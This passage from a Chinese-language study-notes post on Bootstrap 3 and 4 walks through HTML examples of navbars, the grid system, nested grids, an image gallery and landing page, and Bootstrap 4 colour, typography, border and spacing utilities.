class=\"nav navbar-nav\"&gt; &lt;li&gt;&lt;a href=\"#\"&gt;About&lt;/a&gt;&lt;/li&gt; &lt;li&gt;&lt;a href=\"#\"&gt;Contact&lt;/a&gt;&lt;/li&gt; &lt;/ul&gt; &lt;ul class=\"nav navbar-nav navbar-right\"&gt; &lt;li&gt;&lt;a href=\"#\"&gt;Sign Up&lt;/a&gt;&lt;/li&gt; &lt;li&gt;&lt;a href=\"#\"&gt;Login&lt;/a&gt;&lt;/li&gt; &lt;/ul&gt; &lt;/div&gt;&lt;script src=\"https://code.jquery.com/jquery-2.2.4.js\" integrity=\"sha256-iT6Q9iMJYuQiMWNd9lDyBUStIq/8PuOW33aOqmvFpqI=\" crossorigin=\"anonymous\"&gt;&lt;/script&gt; &lt;script src=\"https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js\" integrity=\"sha384-Tc5IQib027qvyjSMfHjOMaLkfuWVxZxUPnCJA7l2mCWNIpG9mGCD8wGNIcPD7Txa\" crossorigin=\"anonymous\"&gt;&lt;/script&gt;&lt;/body&gt;&lt;/html&gt; 在nav-bar中添加id为bs-nav-demo的div。 意味着缩小屏幕会隐藏内部的内容。点击后会显示。 1234567891011121314151617181920212223242526272829303132333435363738&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt; &lt;title&gt;BootStrap&lt;/title&gt; &lt;link href=\"https://stackpath.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css\" rel=\"stylesheet\" integrity=\"sha384-BVYiiSIFeK1dGmJRAkycuHAHRg32OmUcww7on3RYdg4Va+PmSTsz/K68vbdEjh4u\" crossorigin=\"anonymous\"&gt;&lt;/head&gt;&lt;body&gt; &lt;nav class=\"navbar navbar-default\"&gt; &lt;div class=\"container\"&gt; &lt;div class=\"navbar-header\"&gt; &lt;button type=\"button\" class=\"navbar-toggle collapsed\" data-toggle=\"collapse\" data-target=\"#bs-nav-demo\" aria-expanded=\"false\"&gt; &lt;span class=\"sr-only\"&gt;Toggle navigation&lt;/span&gt; &lt;span class=\"icon-bar\"&gt;&lt;/span&gt; &lt;span class=\"icon-bar\"&gt;&lt;/span&gt; &lt;span class=\"icon-bar\"&gt;&lt;/span&gt; &lt;/button&gt; &lt;a class=\"navbar-brand\" href=\"#\"&gt;Brand&lt;/a&gt; &lt;/div&gt; &lt;div class=\"collapse navbar-collapse\" id=\"bs-nav-demo\"&gt; &lt;ul class=\"nav navbar-nav\"&gt; &lt;li&gt;&lt;a href=\"#\"&gt;About&lt;/a&gt;&lt;/li&gt; &lt;li&gt;&lt;a href=\"#\"&gt;Contact&lt;/a&gt;&lt;/li&gt; &lt;/ul&gt; &lt;ul class=\"nav navbar-nav navbar-right\"&gt; &lt;li&gt;&lt;a href=\"#\"&gt;Sign Up&lt;/a&gt;&lt;/li&gt; &lt;li&gt;&lt;a href=\"#\"&gt;Login&lt;/a&gt;&lt;/li&gt; &lt;/ul&gt; &lt;/div&gt; &lt;/div&gt;&lt;script src=\"https://code.jquery.com/jquery-2.2.4.js\" integrity=\"sha256-iT6Q9iMJYuQiMWNd9lDyBUStIq/8PuOW33aOqmvFpqI=\" crossorigin=\"anonymous\"&gt;&lt;/script&gt; &lt;script src=\"https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js\" integrity=\"sha384-Tc5IQib027qvyjSMfHjOMaLkfuWVxZxUPnCJA7l2mCWNIpG9mGCD8wGNIcPD7Txa\" crossorigin=\"anonymous\"&gt;&lt;/script&gt;&lt;/body&gt;&lt;/html&gt; gird系统 将一个区域分为了12个块。 break-point： 极小屏幕：.col-xs- 小屏幕：.col-sm- 中屏幕：.col-md- 大屏幕：.col-lg- 小屏幕不设置，默认是占满，大屏幕不设置默认和最近的小屏幕的规则相同。 1234567891011121314151617181920212223242526272829303132333435363738394041424344&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt; &lt;title&gt;BootStrap&lt;/title&gt; &lt;link href=\"https://stackpath.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css\" rel=\"stylesheet\" integrity=\"sha384-BVYiiSIFeK1dGmJRAkycuHAHRg32OmUcww7on3RYdg4Va+PmSTsz/K68vbdEjh4u\" crossorigin=\"anonymous\"&gt; &lt;style type=\"text/css\"&gt; .pink &#123; background: pink; border: 1px solid purple; &#125; .orange &#123; background: orange; border: 1px dashed red; height: 50px; &#125; &lt;/style&gt;&lt;/head&gt;&lt;body&gt; &lt;!-- 大屏幕每个占1份， 中屏幕每个占2份。 小屏幕每个占4份，极小屏幕没有设置时，默认是占满。 --&gt; &lt;div class=\"row\"&gt; &lt;div class=\"col-lg-1 col-md-2 col-sm-4 pink\"&gt;COL LG 1&lt;/div&gt; &lt;div class=\"col-lg-1 col-md-2 col-sm-4 pink\"&gt;COL LG 1&lt;/div&gt; &lt;div class=\"col-lg-1 col-md-2 col-sm-4 pink\"&gt;COL LG 1&lt;/div&gt; &lt;div class=\"col-lg-1 col-md-2 col-sm-4 pink\"&gt;COL LG 1&lt;/div&gt; &lt;div class=\"col-lg-1 col-md-2 col-sm-4 pink\"&gt;COL LG 1&lt;/div&gt; &lt;div class=\"col-lg-1 col-md-2 col-sm-4 pink\"&gt;COL LG 1&lt;/div&gt; &lt;div class=\"col-lg-1 col-md-2 col-sm-4 pink\"&gt;COL LG 1&lt;/div&gt; &lt;div class=\"col-lg-1 col-md-2 col-sm-4 pink\"&gt;COL LG 1&lt;/div&gt; &lt;div class=\"col-lg-1 col-md-2 col-sm-4 pink\"&gt;COL LG 1&lt;/div&gt; &lt;div class=\"col-lg-1 col-md-2 col-sm-4 pink\"&gt;COL LG 1&lt;/div&gt; &lt;div class=\"col-lg-1 col-md-2 col-sm-4 pink\"&gt;COL LG 1&lt;/div&gt; &lt;div class=\"col-lg-1 col-md-2 col-sm-4 pink\"&gt;COL LG 1&lt;/div&gt; &lt;/div&gt;&lt;script src=\"https://code.jquery.com/jquery-2.2.4.js\" integrity=\"sha256-iT6Q9iMJYuQiMWNd9lDyBUStIq/8PuOW33aOqmvFpqI=\" crossorigin=\"anonymous\"&gt;&lt;/script&gt; &lt;script src=\"https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js\" integrity=\"sha384-Tc5IQib027qvyjSMfHjOMaLkfuWVxZxUPnCJA7l2mCWNIpG9mGCD8wGNIcPD7Txa\" crossorigin=\"anonymous\"&gt;&lt;/script&gt;&lt;/body&gt;&lt;/html&gt; ##grid嵌套 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt; &lt;title&gt;BootStrap&lt;/title&gt; &lt;link href=\"https://stackpath.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css\" rel=\"stylesheet\" integrity=\"sha384-BVYiiSIFeK1dGmJRAkycuHAHRg32OmUcww7on3RYdg4Va+PmSTsz/K68vbdEjh4u\" crossorigin=\"anonymous\"&gt; &lt;style type=\"text/css\"&gt; .pink &#123; background: pink; border: 1px solid purple; &#125; .orange &#123; background: orange; border: 1px dashed red; height: 50px; &#125; &lt;/style&gt;&lt;/head&gt;&lt;body&gt;&lt;div class=\"container\"&gt; &lt;div class=\"row\"&gt; &lt;div class=\"col-md-3 col-sm-6 pink\"&gt; &lt;div class=\"row\"&gt; &lt;div class=\"col-lg-6 orange\"&gt;FIRST HALF&lt;/div&gt; &lt;div class=\"col-lg-6 orange\"&gt;OTHER HALF&lt;/div&gt; &lt;/div&gt; &lt;/div&gt; &lt;div class=\"col-md-3 col-sm-6 pink\"&gt;TOUR DATE!&lt;/div&gt; &lt;div class=\"col-md-3 col-sm-6 pink\"&gt;TOUR DATE!&lt;/div&gt; &lt;div class=\"col-md-3 col-sm-6 pink\"&gt; &lt;div class=\"row\"&gt; &lt;div class=\"col-lg-2 orange\"&gt;&lt;/div&gt; &lt;div class=\"col-lg-2 orange\"&gt;&lt;/div&gt; &lt;div class=\"col-lg-2 orange\"&gt;&lt;/div&gt; &lt;div class=\"col-lg-2 orange\"&gt;&lt;/div&gt; &lt;div class=\"col-lg-2 orange\"&gt;&lt;/div&gt; &lt;div class=\"col-lg-2 orange\"&gt;&lt;/div&gt; &lt;/div&gt; &lt;/div&gt; &lt;/div&gt;&lt;/div&gt;&lt;script src=\"https://code.jquery.com/jquery-2.2.4.js\" integrity=\"sha256-iT6Q9iMJYuQiMWNd9lDyBUStIq/8PuOW33aOqmvFpqI=\" crossorigin=\"anonymous\"&gt;&lt;/script&gt; &lt;script src=\"https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js\" integrity=\"sha384-Tc5IQib027qvyjSMfHjOMaLkfuWVxZxUPnCJA7l2mCWNIpG9mGCD8wGNIcPD7Txa\" crossorigin=\"anonymous\"&gt;&lt;/script&gt;&lt;/body&gt;&lt;/html&gt; grid实战 实战 使用了fontawesome。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192939495&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt; &lt;title&gt;Bootstrap Navbars&lt;/title&gt; &lt;link rel=\"stylesheet\" type=\"text/css\" href=\"https://maxcdn.bootstrapcdn.com/bootstrap/3.3.5/css/bootstrap.min.css\"&gt; &lt;link rel=\"stylesheet\" href=\"https://use.fontawesome.com/releases/v5.6.3/css/all.css\" integrity=\"sha384-UHRtZLI+pbxtHCWp1t77Bi1L4ZtiqrqD80Kn4Z8NTSRyMA2Fd33n5dQ8lWUE00s/\" crossorigin=\"anonymous\"&gt; &lt;style type=\"text/css\"&gt; body &#123; padding-top: 70px; &#125; &lt;/style&gt;&lt;/head&gt;&lt;body&gt; &lt;nav class=\"navbar navbar-inverse navbar-fixed-top\"&gt; &lt;div class=\"container\"&gt; &lt;div class=\"navbar-header\"&gt; &lt;button type=\"button\" class=\"navbar-toggle collapsed\" data-toggle=\"collapse\" data-target=\"#bs-nav-demo\" aria-expanded=\"false\"&gt; &lt;span class=\"sr-only\"&gt;Toggle navigation&lt;/span&gt; &lt;span class=\"icon-bar\"&gt;&lt;/span&gt; &lt;span class=\"icon-bar\"&gt;&lt;/span&gt; &lt;span class=\"icon-bar\"&gt;&lt;/span&gt; &lt;/button&gt; &lt;a href=\"#\" class=\"navbar-brand\"&gt;&lt;span class=\"glyphicon glyphicon-picture\"&gt;&lt;/span&gt; IMGS&lt;/a&gt; &lt;/div&gt; &lt;div class=\"collapse navbar-collapse\" id=\"bs-nav-demo\"&gt; &lt;ul class=\"nav navbar-nav\"&gt; &lt;li&gt;&lt;a href=\"#\"&gt;About&lt;/a&gt;&lt;/li&gt; &lt;li&gt;&lt;a href=\"#\"&gt;Contact&lt;/a&gt;&lt;/li&gt; &lt;/ul&gt; &lt;ul class=\"nav navbar-nav navbar-right\"&gt; &lt;li&gt;&lt;a href=\"#\"&gt;Sign Up&lt;/a&gt;&lt;/li&gt; &lt;li&gt;&lt;a href=\"#\"&gt;Login&lt;/a&gt;&lt;/li&gt; &lt;/ul&gt; &lt;/div&gt; &lt;/div&gt; &lt;/nav&gt; &lt;div class=\"container\"&gt; &lt;div class=\"jumbotron\"&gt; &lt;h1&gt;&lt;i class=\"far fa-thumbs-up fa-2x\"&gt;&lt;/i&gt;&lt;/span&gt; The Image Gallery &lt;/h1&gt; &lt;p&gt;A bunch of beautiful images that I didn't take(except for the first one!)&lt;/p&gt; &lt;/div&gt; &lt;div class=\"row\"&gt; &lt;div class=\"col-lg-4 col-sm-6\"&gt; &lt;div class=\" \"&gt; &lt;img src=\"http://i.imgur.com/qK42fUu.jpg\"&gt; &lt;/div&gt; &lt;/div&gt; &lt;div class=\"col-lg-4 col-sm-6\"&gt; &lt;div class=\"thumbnail\"&gt; &lt;img src=\"https://images.unsplash.com/photo-1435771112039-1e5b2bcad966?dpr=2&amp;fit=crop&amp;fm=jpg&amp;h=825&amp;q=50&amp;w=1450\"&gt; &lt;/div&gt; &lt;/div&gt; &lt;div class=\"col-lg-4 col-sm-6\"&gt; &lt;div class=\"thumbnail\"&gt; &lt;img src=\"https://images.unsplash.com/photo-1442406964439-e46ab8eff7c4?dpr=2&amp;fit=crop&amp;fm=jpg&amp;h=825&amp;q=50&amp;w=1450\"&gt; &lt;/div&gt; &lt;/div&gt; &lt;div class=\"col-lg-4 col-sm-6\"&gt; &lt;div class=\"thumbnail\"&gt; &lt;img src=\"https://images.unsplash.com/photo-1439524970634-649c37a69e5c?ixlib=rb-0.3.5&amp;q=80&amp;fm=jpg&amp;crop=entropy&amp;w=1450&amp;h=825&amp;fit=crop&amp;s=bfda9916c885869b43b70738693428d9\"&gt; &lt;/div&gt; &lt;/div&gt; &lt;div class=\"col-lg-4 col-sm-6\"&gt; &lt;div class=\"thumbnail\"&gt; &lt;img src=\"https://images.unsplash.com/photo-1444090542259-0af8fa96557e?dpr=2&amp;fit=crop&amp;fm=jpg&amp;h=825&amp;q=50&amp;w=1450\"&gt; &lt;/div&gt; &lt;/div&gt; &lt;div class=\"col-lg-4 col-sm-6\"&gt; &lt;div class=\"thumbnail\"&gt; &lt;img src=\"https://images.unsplash.com/photo-1434543177303-ef2cc7707e0d?dpr=2&amp;fit=crop&amp;fm=jpg&amp;h=825&amp;q=50&amp;w=1450\"&gt; &lt;/div&gt; &lt;/div&gt; &lt;div class=\"col-lg-4 col-sm-6\"&gt; &lt;div class=\"thumbnail\"&gt; &lt;img src=\"https://images.unsplash.com/photo-1436262513933-a0b06755c784?dpr=2&amp;fit=crop&amp;fm=jpg&amp;h=825&amp;q=50&amp;w=1450\"&gt; &lt;/div&gt; &lt;/div&gt; &lt;div class=\"col-lg-4 col-sm-6\"&gt; &lt;div class=\"thumbnail\"&gt; &lt;img src=\"https://images.unsplash.com/photo-1439396087961-98bc12c21176?dpr=2&amp;fit=crop&amp;fm=jpg&amp;h=825&amp;q=50&amp;w=1450\"&gt; &lt;/div&gt; &lt;/div&gt; &lt;div class=\"col-lg-4 col-sm-6\"&gt; &lt;div class=\"thumbnail\"&gt; &lt;img src=\"https://images.unsplash.com/photo-1439694458393-78ecf14da7f9?dpr=2&amp;fit=crop&amp;fm=jpg&amp;h=825&amp;q=50&amp;w=1450\"&gt; &lt;/div&gt; &lt;/div&gt; &lt;/div&gt;&lt;script src=\"https://code.jquery.com/jquery-2.1.4.js\"&gt;&lt;/script&gt;&lt;script src=\"https://maxcdn.bootstrapcdn.com/bootstrap/3.3.5/js/bootstrap.min.js\"&gt;&lt;/script&gt;&lt;/body&gt;&lt;/html&gt; 实战2 实战2 unsplash图片：https://unsplash.com 获取图片url：https://source.unsplash.com/lQ3go6MNPzo 使用了fontawesome。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt; &lt;title&gt;Purrfect Match&lt;/title&gt; &lt;link rel=\"stylesheet\" type=\"text/css\" href=\"https://maxcdn.bootstrapcdn.com/bootstrap/3.3.5/css/bootstrap.min.css\"&gt; &lt;link rel=\"stylesheet\" type=\"text/css\" href=\"https://maxcdn.bootstrapcdn.com/font-awesome/4.4.0/css/font-awesome.min.css\"&gt; &lt;link href=\"http://fonts.googleapis.com/css?family=Lato:300,400,700,300italic,400italic,700italic\" rel=\"stylesheet\" type=\"text/css\"&gt;&lt;!-- 手机小屏幕 --&gt;&lt;meta name=\"viewport\" content=\"width=device-width, initial-scale=1\"&gt; &lt;style type=\"text/css\"&gt; /*背景图片*/ body &#123; background: url(https://images.unsplash.com/photo-1415369629372-26f2fe60c467); /*调整图片大小与盒子大小相适应*/ background-size: cover; /*图片居中*/ background-position: center;&#125;body,html &#123; /*扩展高度与宽度*/ width: 100%; height: 100%; font-family: \"Lato\"; color: white;&#125;h1 &#123; font-weight: 700; font-size: 5em;&#125;.content&#123; padding-top: 25%; text-align: center; /*文字阴影*/ text-shadow: 0px 4px 3px rgba(0,0,0,0.4), 0px 8px 13px rgba(0,0,0,0.1), 0px 18px 23px rgba(0,0,0,0.1);&#125;/*分割线*/hr &#123; /*不超过父元素90%的宽度*/ max-width: 90%; width: 400px; border-top: 1px solid #f8f8f8; border-bottom: 1px solid rgba(0,0,0,0.2);&#125; &lt;/style&gt;&lt;/head&gt;&lt;body&gt;&lt;!-- 导航栏 --&gt; &lt;nav class=\"navbar navbar-default navbar-fixed-top\"&gt; &lt;div class=\"container\"&gt; &lt;div class=\"navbar-header\"&gt; &lt;button type=\"button\" class=\"navbar-toggle collapsed\" data-toggle=\"collapse\" data-target=\"#navbar\" aria-expanded=\"false\" aria-controls=\"navbar\"&gt; &lt;span class=\"sr-only\"&gt;Toggle navigation&lt;/span&gt; &lt;span class=\"icon-bar\"&gt;&lt;/span&gt; &lt;span class=\"icon-bar\"&gt;&lt;/span&gt; &lt;span class=\"icon-bar\"&gt;&lt;/span&gt; &lt;/button&gt; &lt;a class=\"navbar-brand\" href=\"#\"&gt;Purrfect Match&lt;/a&gt; &lt;/div&gt; &lt;div id=\"navbar\" class=\"collapse navbar-collapse\"&gt; &lt;ul class=\"nav navbar-nav\"&gt; &lt;li class=\"active\"&gt;&lt;a href=\"#\"&gt;Home&lt;/a&gt;&lt;/li&gt; &lt;li&gt;&lt;a href=\"#about\"&gt;About&lt;/a&gt;&lt;/li&gt; &lt;li&gt;&lt;a href=\"#contact\"&gt;Contact&lt;/a&gt;&lt;/li&gt; &lt;/ul&gt; &lt;ul class=\"nav navbar-nav navbar-right\"&gt; &lt;li&gt;&lt;a href=\"#\"&gt;Signup &lt;i class=\"fa fa-user-plus\"&gt;&lt;/i&gt;&lt;/a&gt;&lt;/li&gt; &lt;li&gt;&lt;a href=\"#about\"&gt;Login &lt;i class=\"fa fa-user\"&gt;&lt;/i&gt;&lt;/a&gt;&lt;/li&gt; &lt;/ul&gt; &lt;/div&gt; &lt;/div&gt; &lt;/nav&gt;&lt;!-- 中部文字 --&gt; &lt;div class=\"container\"&gt; &lt;div class=\"row\"&gt; &lt;div class=\"col-lg-12\"&gt; &lt;div class=\"content\"&gt; &lt;h1&gt;Purrfect Match&lt;/h1&gt; &lt;h3&gt;The Only Human-Feline Dating App&lt;/h3&gt; &lt;hr&gt; &lt;button class=\"btn btn-default btn-lg\"&gt;&lt;i class=\"fa fa-paw fa-fw\"&gt;&lt;/i&gt; Get Started!&lt;/button&gt; &lt;/div&gt; &lt;/div&gt; &lt;/div&gt; &lt;/div&gt; &lt;script type=\"text/javascript\" src=\"https://code.jquery.com/jquery-2.1.4.js\"&gt;&lt;/script&gt; &lt;script type=\"text/javascript\" src=\"https://maxcdn.bootstrapcdn.com/bootstrap/3.3.5/js/bootstrap.min.js\"&gt;&lt;/script&gt;&lt;/body&gt;&lt;/html&gt;` bootstrap4 bootstrap4 相对于bootstrap3的改变：https://getbootstrap.com/docs/4.2/migration/ 第一个bootstrap程序 测试导入的css与js库是否成功： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152&lt;!doctype html&gt;&lt;html lang=\"en\"&gt;&lt;head&gt; &lt;!-- Required meta tags --&gt; &lt;meta charset=\"utf-8\"&gt; &lt;meta name=\"viewport\" content=\"width=device-width, initial-scale=1, shrink-to-fit=no\"&gt; &lt;!-- Bootstrap CSS --&gt; &lt;link rel=\"stylesheet\" href=\"https://stackpath.bootstrapcdn.com/bootstrap/4.1.3/css/bootstrap.min.css\" integrity=\"sha384-MCw98/SFnGE8fJT3GXwEOngsV7Zt27NXFoaoApmYm81iuXoPkFOJwJ8ERdknLPMO\" crossorigin=\"anonymous\"&gt; &lt;title&gt;Hello, world!&lt;/title&gt;&lt;/head&gt;&lt;body&gt; &lt;h1&gt;Hello, world!&lt;/h1&gt; &lt;div class=\"card\" style=\"width: 18rem;\"&gt; &lt;div class=\"card-body\"&gt; &lt;h5 class=\"card-title\"&gt;Card title&lt;/h5&gt; &lt;h6 class=\"card-subtitle mb-2 text-muted\"&gt;Card subtitle&lt;/h6&gt; &lt;p class=\"card-text\"&gt;Some quick example text to build on the card title and make up the bulk of the card's content.&lt;/p&gt; &lt;a href=\"#\" class=\"card-link\"&gt;Card link&lt;/a&gt; &lt;a href=\"#\" class=\"card-link\"&gt;Another link&lt;/a&gt; &lt;/div&gt; &lt;/div&gt; &lt;div class=\"dropdown\"&gt; &lt;button class=\"btn btn-secondary dropdown-toggle\" type=\"button\" id=\"dropdownMenuButton\" data-toggle=\"dropdown\" aria-haspopup=\"true\" aria-expanded=\"false\"&gt; Dropdown button &lt;/button&gt; &lt;div class=\"dropdown-menu\" aria-labelledby=\"dropdownMenuButton\"&gt; &lt;a class=\"dropdown-item\" href=\"#\"&gt;Action&lt;/a&gt; &lt;a class=\"dropdown-item\" href=\"#\"&gt;Another action&lt;/a&gt; &lt;a class=\"dropdown-item\" href=\"#\"&gt;Something else here&lt;/a&gt; &lt;/div&gt; &lt;/div&gt; &lt;!-- Optional JavaScript --&gt; &lt;!-- jQuery first, then Popper.js, then Bootstrap JS --&gt; &lt;script src=\"https://code.jquery.com/jquery-3.3.1.slim.min.js\" integrity=\"sha384-q8i/X+965DzO0rT7abK41JStQIAqVgRVzpbzo5smXKp4YfRvH+8abtTE1Pi6jizo\" crossorigin=\"anonymous\"&gt;&lt;/script&gt; &lt;script src=\"https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.14.3/umd/popper.min.js\" integrity=\"sha384-ZMP7rVo3mIykV+2+9J3UJ46jBk0WLaUAdn689aCwoqbBJiSnjAK/l8WvCWPIPm49\" crossorigin=\"anonymous\"&gt;&lt;/script&gt; &lt;script src=\"https://stackpath.bootstrapcdn.com/bootstrap/4.1.3/js/bootstrap.min.js\" integrity=\"sha384-ChfqqxuZUCnJSK3+MXmPNIyE6ZbWh2IMqE241rYiqJxyMiZ6OW/JmZQ5stwEULTy\" crossorigin=\"anonymous\"&gt;&lt;/script&gt;&lt;/body&gt;&lt;/html&gt; 颜色 颜色，包含了背景颜色与字体颜色：https://getbootstrap.com/docs/4.2/utilities/colors/ 1234567891011121314151617181920212223242526272829303132333435363738&lt;!doctype html&gt;&lt;html lang=\"en\"&gt;&lt;head&gt; &lt;!-- Required meta tags --&gt; &lt;meta charset=\"utf-8\"&gt; &lt;meta name=\"viewport\" content=\"width=device-width, initial-scale=1, shrink-to-fit=no\"&gt; &lt;!-- Bootstrap CSS --&gt; &lt;link rel=\"stylesheet\" href=\"https://stackpath.bootstrapcdn.com/bootstrap/4.1.3/css/bootstrap.min.css\" integrity=\"sha384-MCw98/SFnGE8fJT3GXwEOngsV7Zt27NXFoaoApmYm81iuXoPkFOJwJ8ERdknLPMO\" crossorigin=\"anonymous\"&gt; &lt;title&gt;Colors&lt;/title&gt;&lt;/head&gt;&lt;body&gt; &lt;div class=\"container\"&gt; &lt;h1 class=\"text-primary\"&gt;I am an h1&lt;/h1&gt; &lt;h1 class=\"text-danger\"&gt;I am an h1&lt;/h1&gt; &lt;h1 class=\"text-info\"&gt;I am an h1&lt;/h1&gt; &lt;h1 class=\"text-success\"&gt;I am an h1&lt;/h1&gt; &lt;h1 class=\"text-warning\"&gt;I am an h1&lt;/h1&gt; &lt;h1 class=\"text-white bg-dark\"&gt;I am an h1&lt;/h1&gt; &lt;h1 class=\"text-success\"&gt;I am an h1&lt;/h1&gt; &lt;h1 class=\"bg-light\"&gt;I am an h1&lt;/h1&gt; &lt;/div&gt; &lt;!-- Optional JavaScript --&gt; &lt;!-- jQuery first, then Popper.js, then Bootstrap JS --&gt; &lt;script src=\"https://code.jquery.com/jquery-3.3.1.slim.min.js\" integrity=\"sha384-q8i/X+965DzO0rT7abK41JStQIAqVgRVzpbzo5smXKp4YfRvH+8abtTE1Pi6jizo\" crossorigin=\"anonymous\"&gt;&lt;/script&gt; &lt;script src=\"https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.14.3/umd/popper.min.js\" integrity=\"sha384-ZMP7rVo3mIykV+2+9J3UJ46jBk0WLaUAdn689aCwoqbBJiSnjAK/l8WvCWPIPm49\" crossorigin=\"anonymous\"&gt;&lt;/script&gt; &lt;script src=\"https://stackpath.bootstrapcdn.com/bootstrap/4.1.3/js/bootstrap.min.js\" integrity=\"sha384-ChfqqxuZUCnJSK3+MXmPNIyE6ZbWh2IMqE241rYiqJxyMiZ6OW/JmZQ5stwEULTy\" crossorigin=\"anonymous\"&gt;&lt;/script&gt;&lt;/body&gt;&lt;/html&gt; 排版 1、 bootstrap4增加了display class 2、rem的基准从bootstrap3 中的14px变到了bootstrap4中的16px。 3、bootstrap3中 引言为标签，变为了class 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556&lt;!doctype html&gt;&lt;html lang=\"en\"&gt;&lt;head&gt; &lt;!-- Required meta tags --&gt; &lt;meta charset=\"utf-8\"&gt; &lt;meta name=\"viewport\" content=\"width=device-width, initial-scale=1, shrink-to-fit=no\"&gt; &lt;!-- Bootstrap CSS --&gt; &lt;link rel=\"stylesheet\" href=\"https://stackpath.bootstrapcdn.com/bootstrap/4.1.3/css/bootstrap.min.css\" integrity=\"sha384-MCw98/SFnGE8fJT3GXwEOngsV7Zt27NXFoaoApmYm81iuXoPkFOJwJ8ERdknLPMO\" crossorigin=\"anonymous\"&gt; &lt;title&gt;Typography&lt;/title&gt;&lt;/head&gt;&lt;body&gt; &lt;div class=\"container\"&gt; &lt;!-- Display Headings --&gt; &lt;h1&gt;Regular H1&lt;/h1&gt; &lt;h1 class=\"display-1 text-info\"&gt;Display 1&lt;/h1&gt; &lt;h1 class=\"display-2\"&gt;Display 2&lt;/h1&gt; &lt;h1 class=\"display-3\"&gt;Display 3&lt;/h1&gt; &lt;h1 class=\"display-4\"&gt;Display 4&lt;/h1&gt; &lt;!-- Blockquotes --&gt; &lt;blockquote&gt; &lt;p class=\"mb-0\"&gt;Lorem ipsum dolor sit amet, consectetur adipiscing elit. Integer posuere erat a ante.&lt;/p&gt; &lt;/blockquote&gt; &lt;blockquote class=\"blockquote\"&gt; &lt;p class=\"mb-0\"&gt;Lorem ipsum dolor sit amet, consectetur adipiscing elit. Integer posuere erat a ante.&lt;/p&gt; &lt;/blockquote&gt; &lt;blockquote class=\"blockquote\"&gt; &lt;p class=\"mb-0\"&gt;Lorem ipsum dolor sit amet, consectetur adipiscing elit. Integer posuere erat a ante.&lt;/p&gt; &lt;footer class=\"blockquote-footer\"&gt;Written by my cat &lt;cite title=\"Blue Steele\"&gt;Blue Steele&lt;/cite&gt;&lt;/footer&gt; &lt;/blockquote&gt; &lt;blockquote class=\"blockquote text-right\"&gt; &lt;p class=\"mb-0\"&gt;Lorem ipsum dolor sit amet, consectetur adipiscing elit. Integer posuere erat a ante.&lt;/p&gt; &lt;footer class=\"blockquote-footer\"&gt;Written by my cat &lt;cite title=\"Blue Steele\"&gt;Blue Steele&lt;/cite&gt;&lt;/footer&gt; &lt;/blockquote&gt; &lt;/div&gt; &lt;!-- Optional JavaScript --&gt; &lt;!-- jQuery first, then Popper.js, then Bootstrap JS --&gt; &lt;script src=\"https://code.jquery.com/jquery-3.3.1.slim.min.js\" integrity=\"sha384-q8i/X+965DzO0rT7abK41JStQIAqVgRVzpbzo5smXKp4YfRvH+8abtTE1Pi6jizo\" crossorigin=\"anonymous\"&gt;&lt;/script&gt; &lt;script src=\"https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.14.3/umd/popper.min.js\" integrity=\"sha384-ZMP7rVo3mIykV+2+9J3UJ46jBk0WLaUAdn689aCwoqbBJiSnjAK/l8WvCWPIPm49\" crossorigin=\"anonymous\"&gt;&lt;/script&gt; &lt;script src=\"https://stackpath.bootstrapcdn.com/bootstrap/4.1.3/js/bootstrap.min.js\" integrity=\"sha384-ChfqqxuZUCnJSK3+MXmPNIyE6ZbWh2IMqE241rYiqJxyMiZ6OW/JmZQ5stwEULTy\" crossorigin=\"anonymous\"&gt;&lt;/script&gt;&lt;/body&gt;&lt;/html&gt; boder padding and margin 边框的颜色可以任意的设置颜色、设置是否有边框 边框：https://getbootstrap.com/docs/4.2/utilities/borders/ padding and margin均可任意设置上下左右 margin与padding的有无与大小 padding and margin：https://getbootstrap.com/docs/4.2/utilities/spacing/ 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061&lt;!doctype html&gt;&lt;html lang=\"en\"&gt;&lt;head&gt; &lt;!-- Required meta tags --&gt; &lt;meta charset=\"utf-8\"&gt; &lt;meta name=\"viewport\" content=\"width=device-width, initial-scale=1, shrink-to-fit=no\"&gt; &lt;!-- Bootstrap CSS --&gt; &lt;link rel=\"stylesheet\" href=\"https://stackpath.bootstrapcdn.com/bootstrap/4.1.3/css/bootstrap.min.css\" integrity=\"sha384-MCw98/SFnGE8fJT3GXwEOngsV7Zt27NXFoaoApmYm81iuXoPkFOJwJ8ERdknLPMO\" crossorigin=\"anonymous\"&gt; &lt;title&gt;Utilities&lt;/title&gt;&lt;/head&gt;&lt;body&gt; &lt;div class=\"container\"&gt; &lt;h1 class=\"text-center display-1\"&gt;Utilities&lt;/h1&gt; &lt;!-- Border --&gt; &lt;h5 class=\"border border-danger rounded-top\"&gt;GIVE ME A BORDER&lt;/h5&gt; &lt;h5 class=\"border-top border-info\"&gt;GIVE ME A BORDER&lt;/h5&gt; &lt;h5 class=\"border border-left-0 border-warning\"&gt;GIVE ME A BORDER&lt;/h5&gt; &lt;!-- 大小 --&gt; &lt;button class=\"btn btn-info p-0\"&gt;P0&lt;/button&gt; &lt;button class=\"btn btn-info p-1\"&gt;P1&lt;/button&gt; &lt;button class=\"btn btn-info p-2\"&gt;P2&lt;/button&gt; &lt;button class=\"btn btn-info 